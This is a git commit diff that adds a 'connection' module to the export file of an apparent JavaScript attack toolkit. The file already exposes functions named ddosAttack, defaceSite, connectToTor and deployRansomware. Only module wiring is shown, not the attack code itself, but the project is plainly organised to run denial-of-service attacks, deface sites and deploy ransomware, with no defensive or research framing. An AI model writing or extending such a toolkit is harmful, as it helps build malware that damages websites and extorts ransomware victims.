a223b3e9f3bd8db5bd878576abd6e2edc4770c7e
Brick 🧱 <wanted.glitch@gmail.com>
2025-03-25 23:24:26 -0400

    Added connection module to exports [END OF MESS...

--- main/index.js
+++ main/index.js
@@ -2,10 +2,12 @@ const ddos = require('./ddos/ddos');
 const deface = require('./deface/deface');
 const tor = require('./tor/tor');
 const ransomware = require('./ransomware/ransomware');
+const connection = require('./connection/connection');
 
 module.exports = {
     ddosAttack: ddos.ddosAttack,
     defaceSite: deface.defaceSite,
     connectToTor: tor.connectToTor,
-    deployRansomware: ransomware.deployRansomware
+    deployRansomware: ransomware.deployRansomware,
+    establishConnection: connection.establishConnection
 };
